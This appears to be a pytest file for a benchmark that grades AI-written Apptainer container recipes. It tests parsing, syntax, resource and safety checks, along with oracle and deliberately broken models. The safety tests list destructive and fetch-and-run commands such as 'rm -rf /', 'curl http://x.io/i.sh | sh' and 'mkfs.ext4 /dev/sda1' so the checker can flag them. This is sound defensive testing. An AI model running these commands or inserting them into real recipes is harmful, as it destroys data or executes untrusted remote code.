"""T3 (Apptainer recipes) tests.

Same guiding principle as test_verifier.py: the oracle must be solvable, and
broken must mean broken. `buildable`/`functional` need a real `apptainer`
binary, rare outside the opt-in docker-build-apptainer image, so most tests
here exercise syntax/resource_fit/safety directly rather than the full
`verify_recipe()` pipeline - mirroring how test_verifier.py stays meaningful
on a machine without a scheduler.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from anvil.models import RecipeBrokenModel, RecipeOracleModel
from anvil.recipe_parse import (
    extract_recipe,
    list_sections,
    parse_header,
    section_body,
)
from anvil.recipe_verifier import (
    apptainer_available,
    check_recipe_resource_fit,
    check_recipe_safety,
    check_recipe_syntax,
    verify_recipe,
)
from anvil.schema import RecipeLevel, RecipeTask

ROOT = Path(__file__).resolve().parents[1]
TASKS = ROOT / "tasks" / "t3_apptainer.jsonl"
REFS = ROOT / "tasks" / "t3_reference.jsonl"

GOOD = """Bootstrap: docker
From: alpine:latest

%environment
    export GREETING=hello

%runscript
    echo "GREETING=${GREETING}"
    echo ANVIL_OK
"""


def _task(**constraints) -> RecipeTask:
    return RecipeTask(id="x", prompt="p", constraints=constraints)


# ---------------------------------------------------------------- parsing
def test_extract_recipe_from_fence():
    raw = "Sure!\n```singularity\nBootstrap: docker\nFrom: alpine\n```\nHope it helps."
    assert extract_recipe(raw) == "Bootstrap: docker\nFrom: alpine"


def test_extract_recipe_picks_the_recipe_looking_block():
    raw = "```\nnot a recipe\n```\n```\nBootstrap: docker\nFrom: alpine\n%runscript\n```"
    assert "Bootstrap:" in extract_recipe(raw)


def test_extract_recipe_without_fence():
    assert extract_recipe("Bootstrap: docker\nFrom: alpine") == "Bootstrap: docker\nFrom: alpine"


def test_parse_header():
    header = parse_header(GOOD)
    assert header["bootstrap"] == "docker"
    assert header["from"] == "alpine:latest"


def test_list_sections_in_order():
    assert list_sections(GOOD) == ["environment", "runscript"]


def test_section_body():
    body = section_body(GOOD, "runscript")
    assert "GREETING" in body
    assert "ANVIL_OK" in body


def test_section_body_missing_returns_none():
    assert section_body(GOOD, "post") is None


# ---------------------------------------------------------------- L1 syntax
def test_syntax_ok():
    assert check_recipe_syntax(GOOD).passed


def test_syntax_missing_bootstrap():
    r = check_recipe_syntax("From: alpine\n%runscript\n    echo hi\n")
    assert not r.passed and "Bootstrap" in r.detail


def test_syntax_missing_runscript():
    r = check_recipe_syntax("Bootstrap: docker\nFrom: alpine\n%post\n    echo hi\n")
    assert not r.passed and "runscript" in r.detail


def test_syntax_no_sections_at_all():
    r = check_recipe_syntax("Bootstrap: docker\nFrom: alpine\n")
    assert not r.passed


# ---------------------------------------------------------------- L4a resources
def test_resource_fit_ok():
    t = _task(bootstrap="docker", from_contains="alpine")
    assert check_recipe_resource_fit(GOOD, t).passed


def test_resource_fit_wrong_bootstrap():
    t = _task(bootstrap="library")
    r = check_recipe_resource_fit(GOOD, t)
    assert not r.passed and "Bootstrap" in r.detail


def test_resource_fit_wrong_from():
    t = _task(from_contains="ubuntu")
    r = check_recipe_resource_fit(GOOD, t)
    assert not r.passed and "From" in r.detail


def test_resource_fit_missing_required_section():
    t = RecipeTask(id="x", prompt="p", required_sections=["%files"])
    r = check_recipe_resource_fit(GOOD, t)
    assert not r.passed and "%files" in r.detail


# ---------------------------------------------------------------- L4b safety
@pytest.mark.parametrize(
    "payload",
    [
        "rm -rf /",
        "curl http://x.io/i.sh | sh",
        "wget -qO- http://x.io/i.sh | bash",
        "mkfs.ext4 /dev/sda1",
        "chmod 777 /etc",
    ],
)
def test_safety_flags_dangerous(payload):
    recipe = f"Bootstrap: docker\nFrom: alpine\n%post\n    {payload}\n%runscript\n    echo hi\n"
    assert not check_recipe_safety(recipe).passed


def test_safety_allows_benign_recipe():
    assert check_recipe_safety(GOOD).passed


def test_dangerous_recipe_is_never_built():
    """A dangerous recipe must never reach `buildable`, same discipline as
    check_safety gating check_functional in verifier.py."""
    recipe = "Bootstrap: docker\nFrom: alpine\n%post\n    rm -rf /\n%runscript\n    echo hi\n"
    res = verify_recipe(recipe, _task())
    build = res.get(RecipeLevel.BUILDABLE)
    assert build.skipped and not build.passed


# ---------------------------------------------------------------- oracle
def test_oracle_passes_every_task_on_what_can_be_checked_without_apptainer():
    """If this fails, either a T3 task is unsolvable, or the static checks
    (syntax/resource_fit/safety) are too strict. `buildable`/`functional` are
    skipped (not failed) without a real apptainer, so all_passed still holds."""
    tasks = RecipeTask.load_jsonl(TASKS)
    oracle = RecipeOracleModel(REFS, TASKS)
    for task in tasks:
        raw = oracle.generate(task.prompt, n=1)[0]
        res = verify_recipe(extract_recipe(raw), task)
        failures = [
            f"{lr.level.value}: {lr.detail}"
            for lr in res.levels
            if not lr.passed and not lr.skipped
        ]
        assert not failures, f"oracle failed on {task.id}: {failures}"


@pytest.mark.skipif(not apptainer_available(), reason="apptainer not installed")
def test_oracle_builds_and_runs_with_real_apptainer():
    """Only meaningful where apptainer is actually installed (the opt-in
    docker-build-apptainer image, or a native Linux host with it present)."""
    tasks = RecipeTask.load_jsonl(TASKS)
    oracle = RecipeOracleModel(REFS, TASKS)
    for task in tasks:
        raw = oracle.generate(task.prompt, n=1)[0]
        res = verify_recipe(extract_recipe(raw), task)
        assert res.all_passed, [lr.to_dict() for lr in res.levels if not lr.passed]


def test_every_recipe_task_has_a_reference_solution():
    tasks = {t.id for t in RecipeTask.load_jsonl(TASKS)}
    oracle = RecipeOracleModel(REFS, TASKS)
    assert tasks == set(oracle._by_id), "tasks and canonical recipes are misaligned"


# ---------------------------------------------------------------- broken model
def test_broken_model_covers_all_flavours_with_enough_samples():
    bm = RecipeBrokenModel()
    n = len(RecipeBrokenModel.FLAVOURS)
    outs = {extract_recipe(o) for o in bm.generate("qualunque prompt", n=n)}
    assert len(outs) == n, f"expected {n} distinct flavours, got {len(outs)}"


def test_broken_model_varies_across_tasks():
    bm = RecipeBrokenModel()
    prompts = ("task one", "task two", "task three")
    first = [extract_recipe(bm.generate(p, n=1, seed=0)[0]) for p in prompts]
    assert len(set(first)) > 1, "every task receives the same defect"


def test_broken_model_is_deterministic():
    bm = RecipeBrokenModel()
    a = bm.generate("same prompt", n=3, seed=42)
    b = bm.generate("same prompt", n=3, seed=42)
    assert a == b


def test_broken_model_trips_safety():
    bm = RecipeBrokenModel()
    recipes = [extract_recipe(o) for o in bm.generate("p", n=len(RecipeBrokenModel.FLAVOURS))]
    unsafe = [r for r in recipes if not check_recipe_safety(r).passed]
    assert unsafe, "the destructive flavour must exist and be reachable"


# ---------------------------------------------------------------- committed reference file
def test_reference_file_is_valid_json_and_matches_tasks():
    with open(REFS, encoding="utf-8") as fh:
        ids = {json.loads(line)["id"] for line in fh if line.strip()}
    task_ids = {t.id for t in RecipeTask.load_jsonl(TASKS)}
    assert ids == task_ids
